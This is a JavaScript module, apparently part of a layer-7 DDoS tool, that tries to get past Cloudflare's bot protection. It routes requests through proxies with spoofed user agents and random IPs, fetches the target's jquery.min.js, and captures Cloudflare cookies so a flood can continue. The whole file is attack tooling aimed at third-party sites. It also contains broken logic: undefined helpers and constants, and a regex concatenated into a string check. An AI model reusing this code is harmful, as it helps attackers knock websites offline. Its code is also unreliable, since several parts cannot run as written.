module.exports = function Cloudflare() {
    const request = require('request'),
    requestJar = request.jar(),
        cloudscraper = require('./cloudfare_bypasser/').defaults({
        jar: requestJar
    });
const randomstring = require("randomstring");
    function bypass(proxy, uagent, callback, force) {
            var ip = randomByte() +'.' +
            randomByte() +'.' +
            randomByte() +'.' +
            randomByte();

                    var rand = randomstring.generate({
            length: 12,
            charset: 'mareskizocbteam/2/2/2/2abcdefghijklmnopqstuvwxyz0123456789/ccl/ss'
          });

        var cookie = "";

                cloudscraper.get({
                uri: l7.parsed.protocol + '//' + l7.parsed.host + '/jquery.min.js',
                proxy: proxy,
                method: "GET",
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'DNT': 1,
                    'Referer': l7.target,
                    'Cookie': cookie,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9',
                    'Content-Type': 'application/json'
                }
            }, (err, res, body) => {
                if (err || !res || !body || !res.headers['set-cookie']) {
                    if (res && body && res.headers.server == 'cloudflare' && res.requestMethod !== POST && res.statusCode !== 200) {
                        if (res.headers['set-cookie'][0].startsWith('__cfduid=' + /(.*)/)){
                            console.log('Cookies: ', cookie);
                            return bypass;
                        }
                        return bypass(proxy, uagent, callback, true);
                    }
                    return true;
                }
                cookie = res.headers['set-cookie'].shift().split(';').shift();
                callback(cookie);
            });
}
    return bypass;
}